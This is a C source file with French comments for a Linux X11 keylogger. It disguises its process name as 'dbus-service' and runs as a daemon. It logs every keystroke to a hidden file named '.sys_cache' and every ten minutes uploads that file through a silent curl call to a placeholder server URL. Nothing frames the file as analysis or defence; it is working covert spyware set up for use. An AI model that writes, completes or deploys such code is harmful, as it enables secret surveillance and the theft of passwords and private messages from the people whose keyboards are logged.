#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/prctl.h>

// --- CONFIGURATION DISCRÈTE ---
#define LOG_FILE ".sys_cache"
#define SERVER_URL "http://VOTRE-SERVEUR.com/upload.php" 
#define UPLOAD_INTERVAL 600 
#define PROCESS_NAME "dbus-service" // Nom qui apparaîtra dans htop/top
// ---------------------

int main() {
    // Masquage immédiat du nom du processus
    prctl(PR_SET_NAME, PROCESS_NAME, 0, 0, 0);

    Display *display;
    char keys_return[32];
    char keys_old[32] = {0};
    time_t last_upload = time(NULL);
    
    display = XOpenDisplay(NULL);
    if (display == NULL) return 1;

    // daemon(1, 0) pour rester dans le dossier caché
    if (daemon(1, 0) < 0) return 1;

    FILE *f = fopen(LOG_FILE, "a");
    if (!f) return 1;

    while (1) {
        XQueryKeymap(display, keys_return);

        for (int i = 0; i < 32; i++) {
            if (keys_return[i] != keys_old[i]) {
                for (int j = 0; j < 8; j++) {
                    int keycode = i * 8 + j;
                    if ((keys_return[i] & (1 << j)) && !(keys_old[i] & (1 << j))) {
                        KeySym sym = XKeycodeToKeysym(display, keycode, 0);
                        char *str = XKeysymToString(sym);
                        if (str) {
                            if (strcmp(str, "space") == 0) fprintf(f, " ");
                            else if (strcmp(str, "Return") == 0) fprintf(f, "\n");
                            else if (strlen(str) == 1) fprintf(f, "%s", str);
                            else fprintf(f, "[%s]", str);
                            fflush(f);
                        }
                    }
                }
            }
        }
        memcpy(keys_old, keys_return, 32);

        time_t now = time(NULL);
        if (now - last_upload >= UPLOAD_INTERVAL) {
            fclose(f);
            char cmd[512];
            // Utilisation de curl en mode discret
            snprintf(cmd, sizeof(cmd), "curl -s -F \"file=@%s\" %s > /dev/null 2>&1", LOG_FILE, SERVER_URL);
            system(cmd);
            f = fopen(LOG_FILE, "a");
            last_upload = now;
        }

        usleep(15000); 
    }

    if (f) fclose(f);
    XCloseDisplay(display);
    return 0;
}
